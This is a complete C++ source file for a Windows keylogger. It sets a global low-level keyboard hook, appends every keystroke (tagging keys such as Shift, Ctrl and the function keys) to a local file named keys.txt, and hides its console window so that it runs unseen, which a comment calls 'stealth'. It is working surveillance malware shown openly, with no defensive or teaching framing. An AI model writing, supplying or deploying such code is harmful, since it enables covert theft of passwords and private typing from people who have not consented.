#define _WIN32_WINNT 0x0500
#include <fstream>
#include <windows.h>

using namespace std;

ofstream out;

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    out.open("./keys.txt", ios::app);

    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);

    // If key is being pressed
    if (wParam == WM_KEYDOWN)
    {
        switch (p->vkCode)
        {
        // Invisible keys
        case VK_CAPITAL:
            if((GetKeyState(VK_CAPITAL) & 0x0001) != 0){
                out << "<CAPDOWN>";
            }
            else{
                out << "<CAPON>";
            }
            break;
        case VK_LSHIFT:  
            out << "<SHIFT>";
            break;
        case VK_LCONTROL:
            out << "<LCTRL>";
            break;
        case VK_RCONTROL:
            out << "<RCTRL>";
            break;
        case VK_INSERT:
            out << "<INSERT>";
            break;
        case VK_END:
            out << "<END>";
            break;
        case VK_PRINT:
            out << "<PRINT>";
            break;
        case VK_DELETE:
            out << "<DEL>";
            break;
        case VK_BACK:
            out << "<BK>";
            break;
        case VK_LEFT:
            out << "<LEFTARROW>";
            break;
        case VK_RIGHT:
            out << "<RIGHTARROW>";
            break;
        case VK_UP:
            out << "<UPARROW>";
            break;
        case VK_DOWN:
            out << "<DOWNARROW>";
            break;
        case VK_HOME:
            out << "<HOME>";
            break;
        case VK_TAB:
            out << "<TAB>";
            break;
        case VK_LWIN:
            out << "<WINDOWS>";
            break;
        case VK_F1:
            out << "<F1>";
            break;
        case VK_F2:
            out << "<F2>";
            break;
        case VK_F3:
            out << "<F3>";
            break;
        case VK_F4:
            out << "<F4>";
            break;
        case VK_F5:
            out << "<F5>";
            break;
        case VK_F6:
            out << "<F6>";
            break;
        case VK_F7:
            out << "<F7>";
            break;
        case VK_F8:
            out << "<F8>";
            break;
        case VK_F9:
            out << "<F9>";
            break;
        case VK_F10:
            out << "<F10>";
            break;
        case VK_F11:
            out << "<F11>";
            break;
        case VK_F12:
            out << "<F12>";
            break;
        case VK_ESCAPE:
            out << "<ESCAPE>";
            break;
        case VK_MENU:
            out << "<ALT>";
            break;
        default:
            out << char(tolower(p->vkCode));
        }
    }

    out.close();

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{

    HWND stealth; /*creating stealth (window is not visible)*/
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

    // Set windows hook
    HHOOK keyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        keyboardHookProc,
        hInstance,
        0);

    MSG messages;

    while (GetMessage(&messages, NULL, 0, 0))
    {
        /* Translate virtual-key messages into character messages */
        TranslateMessage(&messages);
        /* Send message to WindowProcedure */
        DispatchMessage(&messages);
    }
}